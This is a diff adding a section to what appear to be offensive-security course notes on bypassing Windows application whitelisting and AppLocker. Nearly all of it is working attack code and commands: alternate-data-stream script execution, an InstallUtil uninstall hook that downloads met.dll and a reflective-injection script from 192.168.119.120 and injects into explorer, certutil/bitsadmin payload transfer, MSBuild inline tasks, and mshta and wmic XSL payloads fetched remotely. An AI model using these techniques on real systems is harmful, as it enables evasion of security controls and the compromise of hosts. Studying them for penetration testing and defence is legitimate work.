@@ -1539,3 +1539,306 @@ catch(e)
 	WScript.Quit(1);
 }
 ```
+
+# Application Whitelisting
+
+## Basic Bypasses
+
+### Trusted Folders
+```bat
+accesschk.exe "student" C:\Windows -wus
+
+icacls.exe C:\Windows\Tasks
+```
+
+### Bypass With DLLs
+```bat
+rundll32 C:\Tools\TestDll.dll,run
+```
+
+```C
+#include "stdafx.h"
+#include <Windows.h>
+
+BOOL APIENTRY DllMain( HMODULE hModule,
+                       DWORD  ul_reason_for_call,
+                       LPVOID lpReserved
+                     )
+{
+    switch (ul_reason_for_call)
+    {
+    case DLL_PROCESS_ATTACH:
+    case DLL_THREAD_ATTACH:
+    case DLL_THREAD_DETACH:
+    case DLL_PROCESS_DETACH:
+        break;
+    }
+    return TRUE;
+}
+
+extern "C" __declspec(dllexport) void run()
+{
+	MessageBoxA(NULL, "Execution happened", "Bypass", MB_OK);
+}
+```
+
+### Alternate Data Streams
+
+`test.js`
+```js
+var shell = new ActiveXObject("WScript.Shell");
+var res = shell.Run("cmd.exe");
+```
+
+TeamViewer version 12 uses a log file (`TeamViewer12_Logfile.log`) that is both writable and executable by the student user.
+
+```bat
+type test.js > "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:test.js"
+
+dir /r "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log"
+```
+
+```bat
+wscript.exe "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:test.js"
+```
+
+### Third Party Execution
+```bat
+python test.py
+```
+
+## Bypassing AppLocker with PowerShell
+
+```pwsh
+$ExecutionContext.SessionState.LanguageMode
+
+[Math]::Cos(1)
+```
+
+### Custom Runspaces
+
+```csharp
+using System;
+using System.Management.Automation;
+using System.Management.Automation.Runspaces;
+
+namespace Bypass
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            Runspace rs = RunspaceFactory.CreateRunspace();
+            rs.Open();
+            PowerShell ps = PowerShell.Create();
+            ps.Runspace = rs;
+            
+            String cmd = "(New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/PowerUp.ps1') | IEX; Invoke-AllChecks | Out-File -FilePath C:\\Tools\\test.txt";
+
+            ps.AddScript(cmd);
+            ps.Invoke();
+            rs.Close();
+        }
+    }
+}
+```
+
+### PowerShell CLM Bypass
+
+```csharp
+using System;
+using System.Management.Automation;
+using System.Management.Automation.Runspaces;
+using System.Configuration.Install;
+
+
+namespace Bypass
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {            
+            Console.WriteLine("This is the main method which is a decoy");
+        }
+    }
+
+    [System.ComponentModel.RunInstaller(true)]
+    public class Sample : System.Configuration.Install.Installer
+    {
+        public override void Uninstall(System.Collections.IDictionary savedState)
+        {            
+            Runspace rs = RunspaceFactory.CreateRunspace();
+            rs.Open();
+            PowerShell ps = PowerShell.Create();
+            ps.Runspace = rs;
+
+            String cmd = "$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/met.dll');(New-Object System.Net.WebClient).DownloadString('http://192.168.45.183/Invoke-ReflectivePEInjection.ps1') | IEX; $procid = (Get-Process -Name explorer).Id; Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid";
+
+            ps.AddScript(cmd);
+            ps.Invoke();
+            rs.Close();
+        }
+    }
+}
+```
+
+```bat
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Tools\Bypass.exe
+```
+
+```bat
+certutil -encode C:\Users\Offsec\source\repos\Bypass\Bypass\bin\x64\Release\Bypass.exe file.txt
+
+bitsadmin /Transfer myJob http://192.168.119.120/file.txt C:\Users\student\enc.txt
+
+certutil -decode enc.txt Bypass.exe
+```
+
+### Reflective Injection Returns
+
+```pwsh
+String cmd = "$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/met.dll');(New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/Invoke-ReflectivePEInjection.ps1') | IEX; $procid = (Get-Process -Name explorer).Id; Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid";
+```
+
+## Bypassing AppLocker with C#
+
+### Microsoft.Workflow.Compiler
+
+`test.txt`
+```csharp
+using System;
+using System.Workflow.ComponentModel;
+public class Run : Activity{
+    public Run() {
+        Console.WriteLine("I executed!");
+    }
+}
+```
+
+```pwsh
+$workflowexe = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe"
+$workflowasm = [Reflection.Assembly]::LoadFrom($workflowexe)
+$SerializeInputToWrapper = [Microsoft.Workflow.Compiler.CompilerWrapper].GetMethod('SerializeInputToWrapper', [Reflection.BindingFlags] 'NonPublic, Static')
+Add-Type -Path 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.Workflow.ComponentModel.dll'
+
+$compilerparam = New-Object -TypeName Workflow.ComponentModel.Compiler.WorkflowCompilerParameters
+$compilerparam.GenerateInMemory = $True
+$pathvar = "test.txt"
+$output = "C:\Tools\run.xml"
+$tmp = $SerializeInputToWrapper.Invoke($null, @([Workflow.ComponentModel.Compiler.WorkflowCompilerParameters] $compilerparam, [String[]] @(,$pathvar)))
+Move-Item $tmp $output
+
+$Acl = Get-ACL $output;$AccessRule= New-Object System.Security.AccessControl.FileSystemAccessRule(“student”,”FullControl”,”none”,”none","Allow");$Acl.AddAccessRule($AccessRule);Set-Acl $output $Acl
+```
+
+```bat
+C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe run.xml results.xml
+```
+
+### MSbuild
+
+`T1127.001.csproj`
+```
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <!-- This inline task executes c# code. -->
+  <!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildBypass.csproj -->
+  <!-- Feel free to use a more aggressive class for testing. -->
+  <Target Name="Hello">
+   <FragmentExample />
+   <ClassExample />
+  </Target>
+  <UsingTask
+    TaskName="FragmentExample"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+    <ParameterGroup/>
+    <Task>
+      <Using Namespace="System" />
+      <Code Type="Fragment" Language="cs">
+        <![CDATA[
+			    Console.WriteLine("Hello From a Code Fragment");
+        ]]>
+      </Code>
+    </Task>
+	</UsingTask>
+	<UsingTask
+    TaskName="ClassExample"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+	<Task>
+	<!-- <Reference Include="System.IO" /> Example Include -->
+      <Code Type="Class" Language="cs">
+        <![CDATA[
+			using System;
+			using Microsoft.Build.Framework;
+			using Microsoft.Build.Utilities;
+			public class ClassExample :  Task, ITask
+			{
+				public override bool Execute()
+				{
+					Console.WriteLine("Hello From a Class.");
+					return true;
+				}
+			}
+        ]]>
+      </Code>
+    </Task>
+  </UsingTask>
+</Project>
+```
+
+```bat
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe T1127.001.csproj
+```
+
+## Bypassing AppLocker with JScript
+
+### JScript and MSHTA
+
+`test.hta`
+
+```xhtml
+<html> 
+<head> 
+<script language="JScript">
+var shell = new ActiveXObject("WScript.Shell");
+var res = shell.Run("cmd.exe");
+</script>
+</head> 
+<body>
+<script language="JScript">
+self.close();
+</script>
+</body> 
+</html>
+```
+
+Shortcut 
+```
+C:\Windows\System32\mshta.exe http://192.168.119.120/test.hta
+```
+
+### XSL Transform
+
+`test.xsl`
+```xsl
+<?xml version='1.0'?>
+<stylesheet version="1.0"
+xmlns="http://www.w3.org/1999/XSL/Transform"
+xmlns:ms="urn:schemas-microsoft-com:xslt"
+xmlns:user="http://mycompany.com/mynamespace">
+
+<output method="text"/>
+	<ms:script implements-prefix="user" language="JScript">
+		<![CDATA[
+			var r = new ActiveXObject("WScript.Shell");
+			r.Run("cmd.exe");
+		]]>
+	</ms:script>
+</stylesheet>
+
+```
+
+```bat
+wmic process get brief /format:"http://192.168.119.120/test.xsl"
+```
